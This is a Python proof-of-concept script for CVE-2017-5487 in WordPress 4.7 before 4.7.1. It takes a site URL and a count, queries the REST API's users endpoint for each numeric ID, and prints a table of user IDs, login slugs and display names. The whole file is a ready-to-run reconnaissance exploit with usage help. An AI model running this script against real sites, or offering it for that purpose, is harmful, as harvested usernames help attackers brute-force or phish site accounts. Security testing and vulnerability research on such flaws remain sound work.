#!/usr/bin/python
# POC for Wordpress CVE-2017-5487
# https://nvd.nist.gov/vuln/detail/CVE-2017-5487
# Benson Macharia (@bensonmachariah)

import sys
import requests
import json
from prettytable import PrettyTable

def banner():
    print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print ("\tCVE 2017-5487 Wordpress User Enumeration PoC")
    print ("\t\tFor WordPress 4.7 before 4.7.1")
    print ("\thttps://nvd.nist.gov/vuln/detail/CVE-2017-5487")
    print ("\t\tBenson Macharia @bensonmachariah")
    print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

def getUser(url, number):
    banner()
    print("\n")
    t = PrettyTable(['#','ID', 'Username', 'Name'])
    counter = 0
    user_list = list()
    for id in range (1, int(number)):
        r = requests.get(url+'/wp-json/wp/v2/users/'+str(id))
        code = r.status_code
        if (code == 200):
            json_text = json.loads(r.text)
            counter+=1
            uid = json_text['id']
            uname = json_text['name']
            uslug = json_text['slug']
            #udesc = json_text['description']
            user_list.append(uid)
            t.add_row([counter,uid,uslug,uname])
            print ("%s. %s  %s  %s" %(counter,uid,uslug,uname))
    if not user_list:
        print ("#######")
        print ("Could not find any users. Confirm that the Wordpress version is before 4.7.1")
        print ("#######")
    else:
        print(t)
    r.close
        

def help():
    '''Prints help message and Quits'''
    print ('[!] Provide the url of the site to enumerate users for and the number of users to fetch')
    print ('[+] Example: %s https://example.com 50' % sys.argv[0])
    sys.exit()

# Check if all args are provided
if len(sys.argv) >= 3:
    url = sys.argv[1]
    number = sys.argv[2]
    # get users
    getUser(url, number)
else:
    help()